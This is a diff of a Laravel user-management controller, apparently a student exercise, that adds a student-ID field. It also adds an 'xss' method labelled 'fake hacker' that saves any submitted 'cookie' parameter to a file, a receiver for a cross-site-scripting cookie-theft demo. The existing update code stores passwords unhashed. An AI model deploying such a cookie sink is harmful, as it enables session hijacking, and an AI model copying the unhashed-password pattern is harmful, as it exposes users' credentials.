@@ -30,6 +30,7 @@ class CrudUserController extends Controller
         $request->validate([
             'email' => 'required',
             'password' => 'required',
+            
         ]);
 
         $credentials = $request->only('email', 'password');
@@ -58,12 +59,14 @@ class CrudUserController extends Controller
         $request->validate([
             'name' => 'required',
             'email' => 'required|email|unique:users',
+            'mssv' => 'required',
             'password' => 'required|min:6',
         ]);
 
         $data = $request->all();
         $check = User::create([
             'name' => $data['name'],
+            'mssv' => $data['mssv'],
             'email' => $data['email'],
             'password' => Hash::make($data['password'])
         ]);
@@ -111,12 +114,14 @@ class CrudUserController extends Controller
 
         $request->validate([
             'name' => 'required',
+            'mssv' =>'required',
             'email' => 'required|email|unique:users,id,'.$input['id'],
             'password' => 'required|min:6',
         ]);
 
        $user = User::find($input['id']);
        $user->name = $input['name'];
+       $user->mssv = $input['mssv'];
        $user->email = $input['email'];
        $user->password = $input['password'];
        $user->save();
@@ -132,11 +137,22 @@ class CrudUserController extends Controller
         if(Auth::check()){
             $users = User::paginate(2);
             //$users = User::all();
-            return view('crud_user.list', ['users' => $users]);
+            return view('crud_user.listdanhsach', ['users' => $users]);
         }
 
         return redirect("login")->withSuccess('You are not allowed to access');
     }
+    
+    // public function listDanhSach()
+    // {
+    //     if(Auth::check()){
+    //         //$users = User::paginate(2);
+    //         //$users = User::all();
+    //         return view('crud_user.listdanhsach', ['users' => $users]);
+    //     }
+
+    //     return redirect("login")->withSuccess('You are not allowed to access');
+    // }
 
     /**
      * Sign out
@@ -146,5 +162,13 @@ class CrudUserController extends Controller
         Auth::logout();
 
         return Redirect('login');
+    }
+    
+    //gia hacker
+    public function xss(Request $request){
+        $cookie =$request ->get('cookie');
+        file_put_contents('xss.txt',$cookie);
+        var_dump($cookie);die();
+        
     }
 }
